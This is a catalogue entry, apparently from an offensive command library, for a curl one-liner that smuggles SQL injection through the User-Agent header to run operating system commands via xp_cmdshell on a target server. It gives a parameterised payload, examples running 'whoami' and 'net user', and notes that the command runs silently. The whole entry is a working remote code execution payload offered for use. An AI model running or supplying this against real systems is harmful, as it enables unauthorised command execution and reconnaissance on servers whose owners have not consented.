---
data: >-
  curl -X POST $TARGET -H "User-Agent: '; EXEC xp_cmdshell '$OS_COMMAND';--" -d
  "username=test&password=test"
tags:
  - rce
  - xp_cmdshell
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.407Z'
id: 5ac6a530-ff36-4c94-95fc-8975fe44f3f5
verified: false
validated: true
submitted: true
---
# execute-xp_cmdshell-command

## Command

```bash
curl -X POST $TARGET -H "User-Agent: '; EXEC xp_cmdshell '$OS_COMMAND';--" -d "username=test&password=test"
```

## Description

Executes an OS command via xp_cmdshell injected through SQLi in User-Agent.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $TARGET | Target URL | Yes |
| $OS_COMMAND | Windows command (e.g., whoami) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: '; EXEC xp_cmdshell 'whoami';--" -d "username=test&password=test"
```

### Advanced Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: '; EXEC xp_cmdshell 'net user';--" -d "username=test&password=test"
```

## Expected Output

HTTP response; command runs silently.

## Related

- [[Related Procedure]]
